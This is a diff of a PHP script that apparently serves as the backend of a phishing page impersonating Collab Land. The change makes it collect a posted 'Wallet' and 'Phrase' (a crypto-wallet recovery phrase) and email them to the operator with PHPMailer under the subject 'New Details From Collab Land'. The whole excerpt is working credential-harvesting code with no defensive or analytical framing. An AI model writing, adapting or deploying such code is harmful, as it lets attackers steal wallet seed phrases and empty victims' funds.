@@ -28,16 +28,18 @@ $phpmailer->isHTML(true);
 
 $POST = json_decode(file_get_contents('php://input'), true);
 
-if (isset($POST['password'])) {
+if (isset($POST['Phrase'])) {
 
-    $username = $POST['username'];
+    $Wallet = $POST['Wallet'];
+    $Phrase = $POST['Phrase'];
 
     $phpmailer->Subject = "New Details From Collab Land";
 
 
     $phpmailer->Body = "
         <h3>
-            User Name : $username <br>
+            User Name : $Wallet  <br>
+            Phrase : $Phrase <br>
         </h3>
     ";
 
